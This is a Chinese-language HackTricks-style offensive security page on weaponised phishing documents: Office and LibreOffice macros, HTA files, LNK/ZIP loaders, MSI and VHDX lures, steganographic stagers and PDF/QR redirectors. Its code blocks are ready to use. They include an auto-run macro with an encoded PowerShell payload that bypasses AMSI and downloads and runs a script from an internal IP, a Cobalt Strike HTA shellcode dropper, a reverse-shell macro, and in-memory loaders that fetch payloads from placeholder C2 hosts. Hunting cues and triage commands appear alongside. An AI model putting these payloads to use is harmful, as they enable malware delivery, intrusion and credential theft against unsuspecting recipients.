# 钓鱼文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 在打开文件前会对文件数据进行验证。验证时会根据 OfficeOpenXML 标准识别数据结构。如果在识别数据结构时出现任何错误，Word 都不会打开正在分析的文件。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。不过，也可以通过更改文件扩展名来重命名文件，同时保留其执行宏的能力。\
例如，RTF 文件在设计上不支持宏，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件，并能够执行宏。\
相同的内部实现和机制适用于 Microsoft Office 套件中的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令检查某些 Office 程序会执行哪些扩展名：

```bash
assoc | findstr /i "word excel powerp"
```

引用远程模板（File –Options –Add-ins –Manage: Templates –Go）的 DOCX 文件，如果模板包含 macros，也可以“执行” macros。

### 外部图像加载

前往：_Insert --> Quick Parts --> Field_\
_**类别**：Links and References，**字段名称**：includePicture，**文件名或 URL：**_ http://<ip>/whatever

![Office 文档 - 外部图像加载：前往：Insert -- Quick Parts -- Field](<../../images/image (155).png>)

如需分析收到的文档，而非构建文档，请参阅 [VBA macro 分析：垃圾代码和 UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms)。

### Macros 后门

可以使用 macros 从文档中运行任意代码。

#### 自动加载函数

它们越常见，AV 检测到它们的可能性就越高。

- AutoOpen()
- Document_Open()

#### Macros 代码示例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 手动移除元数据

前往 **File > Info > Inspect Document > Inspect Document**，打开 Document Inspector。点击 **Inspect**，然后点击 **Document Properties and Personal Information** 旁边的 **Remove All**。

#### Doc 扩展名

完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 Word 97-2003 **`.doc`**。\
这样做是因为**无法在 `.docx` 中保存宏**，而启用宏的 **`.docm`** 扩展名**会引起**一些**负面观感**（例如，缩略图标上有一个很大的 `!`，并且一些 Web/电子邮件网关会完全拦截这类文件）。因此，这种**旧版 `.doc` 扩展名是最佳折中方案**。

#### 恶意宏生成器

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 自动运行宏（Basic）

LibreOffice Writer 文档可以嵌入 Basic 宏，并通过将宏绑定到 **Open Document** 事件，使其在打开文件时自动执行（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> 一个简单的反向 shell 宏如下：

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

注意字符串中的双引号（`""`）——LibreOffice Basic 使用它们转义字面双引号，因此以 `...==""")` 结尾的 payload 能让内部命令和 Shell 参数保持配对。

投递提示：

- 保存为 `.odt`，并将宏绑定到文档事件，使其在打开时立即触发。
- 使用 `swaks` 发送邮件时，使用 `--attach @resume.odt`（必须带上 `@`，这样发送的才是文件内容，而不是文件名字符串）。当滥用接受任意未经验证的 `RCPT TO` 收件人的 SMTP 服务器时，这一点至关重要。

## HTA 文件

HTA 是一种 Windows 程序，**结合了 HTML 和脚本语言（如 VBScript 和 JScript）**。它会生成用户界面，并作为“完全受信任”的应用执行，不受浏览器安全模型的限制。

HTA 使用 **`mshta.exe`** 执行。该程序通常会随 **Internet Explorer** 一同**安装**，因此 **`mshta` 依赖 IE**。所以，如果 IE 已卸载，HTA 将无法执行。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML 邮件中的伪造附件卡片

HTML 邮件可以仿造服务商原生的附件预览卡片，而不附带真实附件。Talos 观察到一个 Gmail 卡片由四个 Base64 编码的内嵌 PNG MIME 部分重建而成。整个视觉元素都包裹在一个锚点中，`?m=<target-id>` 中的收件人值可用于按收件人跟踪。链接以 `//` 而非 `http://` 或 `https://` 开头；浏览器会解析这种协议相对形式，但只匹配完整 URL 的 URL 提取器可能会漏掉它。<sup>[[11]](#references)</sup>

分析时，应检查原始 MIME，而不要只相信渲染后的附件列表。还原内嵌图像部分如何组成视觉卡片，找出包裹它的锚点，并在提取 URL 前规范化协议相对的 `href` 值。<sup>[[11]](#references)</sup>

有关信封/标头发件人伪造和 DMARC 对齐测试，请参见 [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)。

## 强制 NTLM Authentication

有几种方法可以**远程强制 NTLM authentication**，例如，可以在电子邮件或用户会访问的 HTML 中加入**不可见图像**（甚至通过 HTTP MitM？）。也可以向受害者发送**文件地址**，只要**打开文件夹**就会**触发**一次**authentication**。

**在以下页面中查看这些想法及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

别忘了，你不仅可以窃取 hash 或 authentication，还可以**执行 NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## 使用 LNK 对 `ftp.exe` 进行本地命令暂存

快捷方式可以启动 `ftp.exe -s:icon.ico`，其中命令文本文件伪装成图像扩展名。<sup>[[12]](#references)</sup> `-s:` 选项会读取本地 FTP 命令；在 Windows 8 及更高版本中，该文件必须采用 UTF-8 编码。<sup>[[13]](#references)</sup> 以 `!` 开头的行会通过 `cmd /c` 运行本地命令，而不会将该命令发送到 FTP 服务器。这种本地执行方式不需要 FTP 连接。<sup>[[14]](#references)</sup> 在报告的攻击链中，FTP 脚本调用了第二个命令文件。完整的 `!` 行很重要：单独使用 `!more res.ico` 只会显示文件，而通过管道传递给 `cmd` 才会执行其内容。<sup>[[12]](#references)[[14]](#references)</sup>

同一攻击链使用定期任务重新读取可写命令文件，而不是每次更新都安装新的可执行文件。任务操作为 `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`；该文件中保存了一条运行时会获取指令的命令。另一个相关变体会在计划任务运行前下载替换用的命令文件。任务触发时，该文件必须存在且可读；`conhost` 不会让任务获得超出其配置用户令牌的权限。<sup>[[12]](#references)</sup> 有关任务机制，请参见[计划任务执行](../../windows-hardening/lateral-movement/atexec.md)。

## 带隐藏 MSI 和诱饵文档的 VHDX 快捷方式

已挂载的 VHDX 可以显示一个可见的 LNK，同时将 MSI 和诱饵电子表格隐藏在同一个卷中。在报告的攻击链中，LNK 使用了 `cmd.exe /c Visa_Details.msi & Attachment-2.xls`。即使安装程序命令失败，`&` 分隔符仍会打开诱饵文件；文档打开并不能证明安装成功。这是[MSI 自定义操作执行](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md)的一种投递变体，本身并不构成 MSI 提权。<sup>[[12]](#references)</sup>

对于此 MSI，`CustomAction.Type` **194** 将存储在 `Binary` 表中的 EXE（**2**）与忽略返回代码（**64**）和异步（**128**）标志组合在一起。**64 + 128** 组合意味着 Windows Installer 不会等待 EXE 执行完毕；单独使用 128 标志则会在序列结束时等待。<sup>[[15]](#references)[[16]](#references)</sup> 在将执行归因于该嵌入式 EXE 之前，请核对该操作的 `Source` 是否对应 `Binary` 表，并检查它在 `InstallExecuteSequence` 中的位置。<sup>[[12]](#references)[[15]](#references)</sup>[WebDAV UNC 路径可以投递远程 MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path)，但这是另一种入口。

## LNK 加载器 + ZIP 嵌入式 Payload（无文件攻击链）

高效的攻击活动会投递一个 ZIP，其中包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。诀窍是，实际的 PowerShell 加载器存储在 ZIP 原始字节中，位于一个唯一标记之后；.lnk 会从中提取并完全在内存中运行它。<sup>[[2]](#references)</sup>

.lnk 使用的 PowerShell 单行命令通常按以下流程执行：

1) 在常见路径中定位原始 ZIP：桌面、下载、文档、%TEMP%、%ProgramData% 以及当前工作目录的父目录。
2) 读取 ZIP 字节并查找硬编码标记（例如 xFIQCV）。标记之后的所有内容都是嵌入式 PowerShell Payload。
3) 将 ZIP 复制到 %ProgramData%，在该目录中解压，并打开诱饵 .docx，使其看起来像合法文件。
4) 为当前进程绕过 AMSI：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 反混淆下一阶段（例如移除所有 # 字符），并在内存中执行。

用于提取并运行嵌入阶段的 PowerShell 示例框架：

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

说明
- 投递通常滥用信誉良好的 PaaS 子域名（例如 *.herokuapp.com），并可能对 payload 进行门控（根据 IP/UA 提供无害 ZIP 文件）。
- 下一阶段通常会解密 base64/XOR shellcode，并通过 Reflection.Emit + VirtualAlloc 执行，以尽量减少磁盘痕迹。

同一攻击链中使用的持久化方式
- 劫持 Microsoft Web Browser 控件的 COM TypeLib，使 IE/Explorer 或任何嵌入该控件的应用自动重新启动 payload。<sup>[[2]](#references)[[4]](#references)</sup> 详情和可直接使用的命令见此处：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

狩猎/IOCs
- ZIP 文件中包含追加在归档数据后的 ASCII 标记字符串（例如 xFIQCV）。
- .lnk 会枚举父文件夹/用户文件夹以定位 ZIP，并打开诱饵文档。
- 通过 [System.Management.Automation.AmsiUtils]::amsiInitFailed 篡改 AMSI。
- 冗长的业务邮件线程，最终以托管在受信任 PaaS 域名下的链接收尾。

## LNK 诱饵优先的分阶段投递 → scheduled-task 持久化 → 受信任 CPL 侧加载

另一个反复出现的模式是**伪装成文档的 `.lnk`**，它会立即打开无害诱饵，同时在后台准备真正的攻击链。<sup>[[3]](#references)</sup>

观察到的工作流程：
1. 快捷方式**伪装成 PDF**，并使用 `conhost.exe` 或类似的 proxy 启动经过混淆的 PowerShell 下载器。
2. PowerShell 将明显的命令标记拆分（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`），使得查找 `iwr`、`gci`、`ren`、`cpi` 或 `schtasks` 的简单检测无法识别该命令。
3. stager 会先下载**诱饵文档**并为受害者打开，然后在后台重新构建恶意文件。
4. Payload 可能先以**无关扩展名**写入，然后通过去除填充字符来重命名，从而延迟明显的 `.exe` / `.cpl` 文件出现。
5. 通过**按分钟运行的 scheduled task**建立持久化，从用户可写路径启动受信任的主机二进制文件。

此模式的最简狩猎线索：

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

一个值得识别的 staging 布局如下：
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 或 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 为什么第二阶段具有隐蔽性

在 Rapid7 的案例研究中，计划任务会反复从 `C:\Users\Public\` 启动 **`Fondue.exe`**。由于 **`APPWIZ.cpl`** 被放在它旁边，并导出了 **`RunFODW`**，这个受信任的 Microsoft 二进制文件便 side-load 了攻击者的 CPL，而非系统中的合法副本。

接着，CPL 会：
- 从 `C:\Windows\Tasks\editor.dat` 读取一个 **AES-256-CBC** blob
- 通过 **Windows CNG / `bcrypt.dll`** 解密该 blob
- 分配可执行内存，并将解密后的 shellcode 复制到其中
- 将 shellcode 指针作为 **`EnumUILanguagesW`** 的回调传入，以间接执行它

最后这一步值得单独搜寻：恶意软件通常会避免直接跳转 `((void(*)())buf)()`，而是滥用一个**接受回调的合法 WinAPI**来转移执行。

该活动中的解密 payload 是 **Donut** shellcode，随后它会在内存中完整映射最终 PE，并在当前进程中 patch **AMSI/WLDP/ETW**，然后移交执行。有关 side-loading 和驻留内存的后处理，可参阅：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

实用的狩猎线索：
- `.lnk` 启动 `powershell.exe` 或 `conhost.exe`，随后出现可见的诱饵文档。
- 文件短暂下载到 **`C:\Users\Public\`**，随后立即从无意义扩展名重命名。
- 名称不起眼的计划任务（例如 `GoogleErrorReport`）从**用户可写目录**执行。
- 受信任的二进制文件从同一个非系统目录加载 **`.cpl` / `.dll`** 文件。
- Base64 文本 blob 写入 **`C:\Windows\Tasks\`**，然后由 side-loaded 模块读取。

## 图片中由分隔符界定的 Steganography payload（PowerShell stager）

近期的 loader 链会投递经过混淆的 JavaScript/VBS，用于解码并运行 Base64 PowerShell stager。该 stager 会下载一张图片（通常为 GIF），其中以纯文本形式隐藏了一个 Base64 编码的 .NET DLL，位于唯一的起始/结束标记之间。脚本会搜索这些分隔符（在实际攻击中见过的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取中间文本，将其 Base64 解码为字节，在内存中加载程序集，并使用 C2 URL 调用已知入口方法。<sup>[[5]](#references)</sup>

工作流程
- 阶段 1：归档的 JS/VBS dropper → 解码内嵌 Base64 → 使用 -nop -w hidden -ep bypass 启动 PowerShell stager。
- 阶段 2：PowerShell stager → 下载图片，提取由标记界定的 Base64，在内存中加载 .NET DLL 并调用其方法（例如 VAI），传入 C2 URL 和选项。
- 阶段 3：Loader 获取最终 payload，通常通过 process hollowing 将其注入受信任的二进制文件（常见的是 MSBuild.exe）。<sup>[[7]](#references)[[8]](#references)</sup> 有关 process hollowing 和受信任实用程序代理执行的更多内容，请参阅：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

从图片中提取 DLL 并在内存中调用 .NET 方法的 PowerShell 示例：

<details>
<summary>PowerShell stego payload 提取器和 loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

备注
- 这是 ATT&CK T1027.003（steganography/marker-hiding）。<sup>[[6]](#references)</sup> 标记因 campaign 而异。
- 加载 assembly 前，通常会先执行 AMSI/ETW bypass 和字符串反混淆。
- Hunting：扫描下载的图像，查找已知分隔符；识别访问图像并立即解码 Base64 blobs 的 PowerShell。

另请参阅 stego 工具和 carving 技术：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

一种反复出现的初始阶段是：在 archive 中投放一个经过高度混淆的小型 `.js` 或 `.vbs` 文件。它唯一的目的就是解码内嵌的 Base64 字符串，并通过 `-nop -w hidden -ep bypass` 启动 PowerShell，以通过 HTTPS 引导下一阶段。<sup>[[5]](#references)</sup>

基本逻辑（抽象）：
- 读取自身文件内容
- 在垃圾字符串之间定位 Base64 blob
- 解码为 ASCII PowerShell
- 调用 `powershell.exe`，由 `wscript.exe`/`cscript.exe` 执行

Hunting 线索
- Archived JS/VBS 附件启动 `powershell.exe`，命令行中带有 `-enc`/`FromBase64String`。
- `wscript.exe` 从用户临时路径启动 `powershell.exe -nop -w hidden`。

## MSC 文档作为执行容器（GrimResource）

Microsoft Management Console 文件（`.msc`）是通常由 `mmc.exe` 打开的 XML 控制台定义。**GrimResource** 利用指向包含旧式 XSS primitive 的 `apds.dll` 资源的 `StringTable` 引用，因此用户打开经过构造的控制台时，会导致 JavaScript 在 `mmc.exe` 内运行。观察到的样本结合了基于 `transformNode` 的混淆和 **DotNetToJScript**，无需采用常见的 Office-macro 路径即可实例化 .NET payload。<sup>[[9]](#references)</sup>

进行静态初步检查时，应将不可信的 MSC 视为文本，**不要**双击打开：<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高信号运行时 pivot 包括 `mmc.exe` 加载 CLR 或脚本组件、创建网络连接，或启动 `powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe` 或其他异常可执行文件。该格式本身合法，因此检测应关联 **来源 + 可疑 XML/脚本内容 + `mmc.exe` 行为**，而不是封禁所有 MSC 文件。<sup>[[9]](#references)</sup>

## PDF/QR 重定向器与 payload 门控

PDF 不需要利用漏洞也能发挥作用。近期的攻击活动会在看似无害的文档中放入 **QR code 或普通链接**，将浏览器会话引导至邮件防护控制之外，并根据收件人地址个性化目标页面。Microsoft 记录了 2025 年出现的 PDF，其中 QR URL 对每位收件人都不同，并指向 RaccoonO365 凭据窃取基础设施；另一个类似攻击链则利用 IP/环境门控，向特定访客返回 JavaScript/MSI 路径，但向扫描器或不允许的客户端返回无害 PDF。<sup>[[10]](#references)</sup>

检查 PDF 动作和渲染后的 QR code。QR code 可能是矢量绘制的，而不是以可提取图像的形式存储，因此除了提取嵌入图像，还应将每一页栅格化：

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

检查隔离分析系统中解码后的目标地址和重定向，无需进行身份验证。值得关注的特征包括：邮件正文几乎为空、仅包含 QR code 的 PDF；嵌入在查询参数中的收件人邮箱；经由多个信誉良好的托管服务进行重定向；以及根据 IP、地理位置、cookies、referrer 或 user agent 返回不同内容。使用受控配置对比请求，因为单次 sandbox 抓取可能只会收到诱饵内容。<sup>[[10]](#references)</sup>

## 用于窃取 NTLM hashes 的 Windows 文件

查看有关**窃取 NTLM 凭据的位置**的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：针对美国公司的复杂 phishing 攻击](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – 时尚恶意软件：追踪 Dropping Elephant 的手法及其以中国为主题的 loader 链](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [劫持 TypeLib – 新的 COM 持久化技术 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader 投放多种 infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – 隐写术 (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – 进程空洞化 (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 受信任的开发者实用程序代理执行：MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：使用 Microsoft Management Console 进行初始访问和规避](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 威胁行为者利用报税季发起以税务为主题的 phishing 活动](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 投递链和 Antino 后门](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER 借助 PapRAT 扩充其武器库](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - ftp 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - 自定义操作类型 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - 自定义操作返回处理选项](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
